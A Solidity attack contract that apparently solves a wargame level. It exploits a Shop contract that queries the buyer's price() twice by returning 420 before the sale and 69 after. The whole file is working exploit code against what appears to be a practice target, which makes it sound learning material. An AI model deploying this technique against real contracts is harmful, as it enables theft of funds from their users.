// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Shop} from "./Shop.sol";

contract ShopHack {
    error AttackFailed();

    Shop private immutable TARGET;

    constructor(address _target) {
        TARGET = Shop(_target);
    }

    function attack() external {
        TARGET.buy();
        if (TARGET.price() != 69) revert AttackFailed();
    }

    function price() external view returns (uint256) {
        if (!TARGET.isSold()) {
            return 420;
        }
        return 69;
    }
}
